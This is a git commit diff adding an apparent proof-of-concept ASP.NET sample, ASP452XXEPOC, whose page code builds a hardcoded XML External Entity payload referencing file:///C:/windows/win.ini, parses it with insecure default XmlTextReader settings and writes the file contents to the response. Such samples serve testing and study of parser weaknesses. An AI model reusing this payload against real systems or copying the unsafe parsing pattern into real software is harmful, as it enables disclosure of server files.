1c7ec09e05cf6faf8a026bfbd186f9078bd47e98
sum-catnip <catnip@catnip.fyi>
2024-01-18 10:10:54 +0100

    + samples

---
+++ ASP452XXEPOC/Default.aspx.cs
@@ -0,0 +1,24 @@
+﻿using System;
+using System.IO;
+using System.Web.UI;
+using System.Xml;
+using System.Text;
+
+namespace ASP452XXEPOC
+{
+    public partial class _Default : Page
+    {
+        protected void Page_Load(object sender, EventArgs e)
+        {
+            string xxePayload = "<!DOCTYPE doc [<!ENTITY win SYSTEM 'file:///C:/windows/win.ini'>]>"
+                 + "<doc>&win;</doc>";
+            string xml = "<?xml version='1.0' ?>" + xxePayload;
+            MemoryStream stream = new MemoryStream(Encoding.UTF8.GetBytes(xml));
+            StreamReader streamReader = new StreamReader(stream);
+            XmlTextReader r = new XmlTextReader(streamReader);
+            XmlDocument doc = new XmlDocument();
+            doc.Load(r);
+            Response.Write(doc.InnerText);
+        }
+    }
+}
---
+++ ASP452XXEPOC/Global.asax
@@ -0,0 +1,1 @@
+﻿<%@ Application Codebehind="Global.asax.cs" Inherits="ASP452XXEPOC.Global" Language="C#" %>
